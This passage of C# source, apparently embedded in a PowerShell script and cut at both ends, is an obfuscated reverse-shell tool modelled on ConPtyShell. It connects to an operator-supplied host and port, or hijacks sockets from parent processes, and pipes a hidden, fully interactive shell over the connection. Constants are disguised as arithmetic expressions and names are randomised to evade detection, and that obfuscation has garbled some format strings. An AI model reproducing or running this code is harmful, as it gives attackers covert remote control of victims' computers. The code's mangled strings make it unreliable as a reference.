            throw new CPTSHException("No sockets found, so no hijackable sockets :( Exiting...");
        return targetSocketHandle;
    }
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        int FIONBIO = $(2897011023 + -5044206289);
        int NonBlockingMode = $(187 % 62);
        int BlockingMode = $(-24 -bxor -24);
        int result;
        if (mode == $(97 + -96))
            result = ioctlsocket(socket, FIONBIO, ref NonBlockingMode);
        else
            result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
        if (result == $(14 / -14))
            throw new CPTSHException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}

// source from --> https://stackoverflow.com/a/$(100381650 / 30)
[StructLayout(LayoutKind.Sequential)]
public struct ParentProcessUtilities
{
    // These members must match PROCESS_BASIC_INFORMATION
    internal IntPtr Reserved1;
    internal IntPtr PebBaseAddress;
    internal IntPtr Reserved2_0;
    internal IntPtr Reserved2_1;
    internal IntPtr UniqueProcessId;
    internal IntPtr InheritedFromUniqueProcessId;

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ParentProcessUtilities processInformation, int processInformationLength, out int returnLength);

    public static Process GetParentProcess()
    {
        return GetParentProcess(Process.GetCurrentProcess().Handle);
    }

    public static Process GetParentProcess(int id)
    {
        Process process = Process.GetProcessById(id);
        return GetParentProcess(process.Handle);
    }

    public static Process GetParentProcess(IntPtr handle)
    {
        ParentProcessUtilities pbi = new ParentProcessUtilities();
        int returnLength;
        int status = NtQueryInformationProcess(handle, $(-69 -bxor -69), ref pbi, Marshal.SizeOf(pbi), out returnLength);
        if (status != $(47 - 47))
            throw new CPTSHException(status.ToString());
        try
        {
            return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
        }
        catch (ArgumentException)
        {
            // not found
            return null;
        }
    }
}

public static class CPTSH
{
    private const string errorString = "{{{CPTSHException}}}\r\n";
    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const int STARTF_USESTDHANDLES = 0x00000100;
    private const int BUFFER_SIZE_PIPE = $(11534336 / 11);
    private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const UInt32 INFINITE = 0xFFFFFFFF;
    private const int SW_HIDE = $(42 - 42);
    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint FILE_SHARE_WRITE = 0x00000002;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    private const uint OPEN_EXISTING = $(114 / 38);
    private const int STD_INPUT_HANDLE = $(-2 * -5);
    private const int STD_OUTPUT_HANDLE = $(43 + -54);
    private const int STD_ERROR_HANDLE = $(33 - 45);
    private const int WSAEWOULDBLOCK = $(471645 / 47);
    private const int FD_READ = ($(-85 + 86) << $(84 % 28));


    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct COORD
    {
        public short X;
        public short Y;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = $(636 -bxor 893))]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = $(873 % 186))]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcessEx(string lpApplicationName, string lpXRiY0H, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    private static extern bool CreateProcess(string lpApplicationName, string lpXRiY0H, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ClosePseudoConsole(IntPtr hPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocConsole();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern bool FreeConsole();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern ushort htons(ushort hostshort);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr WSACreateEvent();

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAEventSelect(IntPtr s, IntPtr hEventObject, int lNetworkEvents);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAWaitForMultipleEvents(int cEvents, IntPtr[] lphEvents, bool fWaitAll, int dwTimeout, bool fAlertable);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSAResetEvent(IntPtr hEvent);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSACloseEvent(IntPtr hEvent);

    [DllImport("ntdll.dll")]
    private static extern uint NtSuspendProcess(IntPtr processHandle);

    [DllImport("ntdll.dll")]
    private static extern uint NtResumeProcess(IntPtr processHandle);

    private static void InitWSAThread()
    {
        WSAData data;
        if (WSAStartup($(-35 -bxor -33) << $(224 % 72) | $(32 -bxor 34), out data) != $(-19 -bxor -19))
            throw new CPTSHException(String.Format("WSAStartup failed with error code: {(64 + -64)}", WSAGetLastError()));
    }

    private static IntPtr connectRemote(string $MklM3X, int KCYCqBu)
    {
        int port = $(42 -bxor 42);
        int error = $(34 % 34);
        string host = $MklM3X;

        try
        {
            port = Convert.ToInt32(KCYCqBu);
        }
        catch
        {
            throw new CPTSHException("Specified port is invalid: " + KCYCqBu.ToString());
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, $(-76 + 76), WSA_FLAG_OVERLAPPED);
        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)$(9 -bxor 11);
        sockinfo.sin_addr = inet_addr(host);
        sockinfo.sin_port = (short)htons((ushort)port);

        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != $(-95 -bxor -95))
        {
            error = WSAGetLastError();
            throw new CPTSHException(String.Format("WSAConnect failed with error code: {(-30 -bxor -30)}''''", error));
        }

        return socket;
    }

    private static void TryParserz5xep9uoQwmqFromSocket(IntPtr shellSocket, ref uint rz5xe, ref uint p9uoQwmq)
    {
        Thread.Sleep($(2 * 250));//little tweak for slower connections
        byte[] received = new byte[$(571 % 157)];
        int rz5xeTemp, p9uoQwmqTemp;
        int bytesReceived = recv(shellSocket, received, $(282 - 182), $(-39 + 39));
        try
        {
            string sizeReceived = Encoding.ASCII.GetString(received, $(56 - 56), bytesReceived);
            string rz5xeString = sizeReceived.Split(' ')[$(27 -bxor 27)].Trim();
            string p9uoQwmqString = sizeReceived.Split(' ')[$(91 - 90)].Trim();
            if (Int32.TryParse(rz5xeString, out rz5xeTemp) && Int32.TryParse(p9uoQwmqString, out p9uoQwmqTemp))
            {
                rz5xe = (uint)rz5xeTemp;
                p9uoQwmq = (uint)p9uoQwmqTemp;
            }
        }
        catch
        {
            return;
        }
    }

    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        pSec.bInheritHandle = $(64 - 63);
        pSec.lpSecurityDescriptor = IntPtr.Zero;
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new CPTSHException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new CPTSHException("Could not create the OutputPipe");
    }

    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
    {
        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
        IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
        SetStdHandle(STD_ERROR_HANDLE, hStdout);
        SetStdHandle(STD_INPUT_HANDLE, hStdin);
    }

    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)
    {
        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
    }

    private static void EnableVirtualTerminalSequenceProcessing()
    {
        uint outConsoleMode = $(200 % 40);
        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (!GetConsoleMode(hStdOut, out outConsoleMode))
        {
            throw new CPTSHException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new CPTSHException("Could not enable virtual terminal processing");
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rz5xe, uint p9uoQwmq)
    {
        int result = $(2 -bxor -3);
        EnableVirtualTerminalSequenceProcessing();
        COORD consoleCoord = new COORD();
        consoleCoord.X = (short)p9uoQwmq;
        consoleCoord.Y = (short)rz5xe;
        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, $(55 - 55), out handlePseudoConsole);
        return result;
    }

    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        IntPtr lpSize = IntPtr.Zero;
        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, $(90 -bxor 91), $(-75 -bxor -75), ref lpSize);
        if (success || lpSize == IntPtr.Zero)
        {
            throw new CPTSHException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, $(19 / 19), $(91 -bxor 91), ref lpSize);
        if (!success)
        {
            throw new CPTSHException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, $(64 % 32), attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
        if (!success)
        {
            throw new CPTSHException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }

    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string XRiY0H)
    {
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        int securityAttributeSize = Marshal.SizeOf(pSec);
        pSec.nLength = securityAttributeSize;
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
        tSec.nLength = securityAttributeSize;
        bool success = CreateProcessEx(null, XRiY0H, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
        if (!success)
        {
            throw new CPTSHException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }

    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string XRiY0H)
    {
        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, XRiY0H);
        return processInfo;
    }

    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[$(-10 -bxor -10)];
        IntPtr shellSocket = (IntPtr)threadParameters[$(81 - 80)];
        int bufferSize = $(212992 / 26);
        bool readSuccess = false;
        Int32 bytesSent = $(55 -bxor 55);
        uint dwBytesRead = $(27 % 27);
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, $(-2 + 2));
        } while (bytesSent > $(17 + -17) && readSuccess);
        // Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
    }

    private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[$(-43 -bxor -43)];
        IntPtr shellSocket = (IntPtr)threadParameters[$(49 -bxor 48)];
        int bufferSize = $(44765 -bxor 36573);
        bool readSuccess = false;
        Int32 bytesSent = $(-59 + 59);
        uint dwBytesRead = $(-12 -bxor -12);
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            // Console.WriteLine("debug ThreadReadPipeWriteSocket ReadFile: dwBytesRead = " + dwBytesRead + " Marshal.GetLastWin32Error() " + Marshal.GetLastWin32Error());
            do
            {
                bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, $(-23 -bxor -23));
                // Console.WriteLine("debug ThreadReadPipeWriteSocket send: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
            } while (WSAGetLastError() == WSAEWOULDBLOCK);
        } while (bytesSent > $(85 + -85) && readSuccess);
    }

    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket, bool overlappedSocket)
    {
        object[] threadParameters = new object[$(82 % 16)];
        threadParameters[$(76 % 38)] = OutputPipeRead;
        threadParameters[$(77 -bxor 76)] = shellSocket;
        Thread thThreadReadPipeWriteSocket;
        if(overlappedSocket)
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
        else
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
        thThreadReadPipeWriteSocket.Start(threadParameters);
        return thThreadReadPipeWriteSocket;
    }

    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[$(-25 + 25)];
        IntPtr shellSocket = (IntPtr)threadParameters[$(-39 -bxor -40)];
        IntPtr hChildProcess = (IntPtr)threadParameters[$(354 % 88)];
        int bufferSize = $(2 * 4096);
        bool writeSuccess = false;
        Int32 nBytesReceived = $(52 + -52);
        uint bytesWritten = $(-78 + 78);
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, $(95 % 19));
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
        } while (nBytesReceived > $(102 % 34) && writeSuccess);
        //  Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
        TerminateProcess(hChildProcess, $(37 - 37));
    }

    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[$(88 -bxor 88)];
        IntPtr shellSocket = (IntPtr)threadParameters[$(23 + -22)];
        IntPtr hChildProcess = (IntPtr)threadParameters[$(190 % 47)];
        int bufferSize = $(2 * 4096);
        bool writeSuccess = false;
        Int32 nBytesReceived = $(-50 + 50);
        uint bytesWritten = $(525 % 105);
        bool socketBlockingOperation = false;
        IntPtr wsaReadEvent = WSACreateEvent();
        // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
        WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);
        IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, $(2552 -bxor 2060), false);
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, $(-13 + 13));
            // we still check WSAEWOULDBLOCK for a more robust implementation
            if (WSAGetLastError() == WSAEWOULDBLOCK)
            {
                socketBlockingOperation = true;
                continue;
            }
            WSAResetEvent(wsaReadEvent);
            socketBlockingOperation = false;
            // Console.WriteLine("debug: ThreadReadSocketWritePipe recv: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
            // Console.WriteLine("debug ThreadReadSocketWritePipe WriteFile: bytesWritten = " + bytesWritten + " Marshal.GetLastWin32Error() = " + Marshal.GetLastWin32Error());
        } while (socketBlockingOperation || (nBytesReceived > $(94 -bxor 94) && writeSuccess));
        WSACloseEvent(wsaReadEvent);
        TerminateProcess(hChildProcess, $(100 - 100));
    }

    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess, bool overlappedSocket)
    {
        object[] threadParameters = new object[$(76 - 73)];
        threadParameters[$(62 + -62)] = InputPipeWrite;
        threadParameters[$(89 - 88)] = shellSocket;
        threadParameters[$(168 % 83)] = hChildProcess;
        Thread thReadSocketWritePipe;
        if(overlappedSocket)
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeOverlapped);
        else
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeNonOverlapped);
        thReadSocketWritePipe.Start(threadParameters);
        return thReadSocketWritePipe;
    }

    public static string SpawnCPTSH(string $MklM3X, int KCYCqBu, uint rz5xe, uint p9uoQwmq, string XRiY0H, bool uDr8EShell)
    {
        IntPtr shellSocket = IntPtr.Zero;
        IntPtr InputPipeRead = IntPtr.Zero;
        IntPtr InputPipeWrite = IntPtr.Zero;
        IntPtr OutputPipeRead = IntPtr.Zero;
        IntPtr OutputPipeWrite = IntPtr.Zero;
        IntPtr handlePseudoConsole = IntPtr.Zero;
        IntPtr oldStdIn = IntPtr.Zero;
        IntPtr oldStdOut = IntPtr.Zero;
        IntPtr oldStdErr = IntPtr.Zero;
        bool newConsoleAllocated = false;
        bool parentSocketInherited = false;
        bool grandParentSocketInherited = false;
        bool conptyCompatible = false;
        bool IsSocketOverlapped = true;
        string output = "";
        Process currentProcess = null;
        Process parentProcess = null;
        Process grandParentProcess = null;
        if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
            conptyCompatible = true;
        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
        // comment the below function to debug errors
        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
        // init wsastartup stuff for this thread
        InitWSAThread();
        if (conptyCompatible)
        {
            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n'");
            if (uDr8EShell)
            {
                List<IntPtr> socketsHandles = new List<IntPtr>();
                currentProcess = Process.GetCurrentProcess();
                parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
                // try to duplicate the socket for the current process
                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    // if no sockets are found in the current process we try to hijack our current parent process socket
                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                        if (shellSocket == IntPtr.Zero)
                        {
                            throw new CPTSHException("No \\Device\\Afd objects found. Socket duplication failed.''");
                        }
                        else
                        {
                            grandParentSocketInherited = true;
                        }
                    }
                    else
                    {
                        // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                        parentSocketInherited = true;
                        if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                    }
                }
                else
                {
                    // the current process got a usable socket, let's see if the parents use the socket
                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                }
            }
            else
            {
                shellSocket = connectRemote($MklM3X, KCYCqBu);
                if (shellSocket == IntPtr.Zero)
                {
                    output += string.Format("{(-83 -bxor -83)}Could not connect to ip {(181 % 90)} on port {(14 / 7)}", errorString, $MklM3X, KCYCqBu.ToString());
                    return output;
                }
                TryParserz5xep9uoQwmqFromSocket(shellSocket, ref rz5xe, ref p9uoQwmq);
            }
            if (GetConsoleWindow() == IntPtr.Zero)
            {
                AllocConsole();
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                newConsoleAllocated = true;
            }
            // debug code for checking handle duplication
            // Console.WriteLine("debug: Creating pseudo console...");
            // Thread.Sleep($(-262918 -bxor -441382));
            // return "";
            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rz5xe, p9uoQwmq);
            if (pseudoConsoleCreationResult != $(-18 -bxor -18))
            {
                output += string.Format("{(44 + -44)}Could not create psuedo console. Error Code {(154 % 51)}", errorString, pseudoConsoleCreationResult.ToString());
                return output;
            }
            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, XRiY0H);
        }
        else
        {
            if (uDr8EShell)
            {
                output += string.Format("Could not uDr8E shell to fully interactive because ConPTY is not compatible on this system");
                return output;
            }
            shellSocket = connectRemote($MklM3X, KCYCqBu);
            if (shellSocket == IntPtr.Zero)
            {
                output += string.Format("{(84 + -84)}Could not connect to ip {(-33 -bxor -34)} on port {(117 % 23)}", errorString, $MklM3X, KCYCqBu.ToString());
                return output;
            }
            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n'");
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
            sInfo.hStdInput = InputPipeRead;
            sInfo.hStdOutput = OutputPipeWrite;
            sInfo.hStdError = OutputPipeWrite;
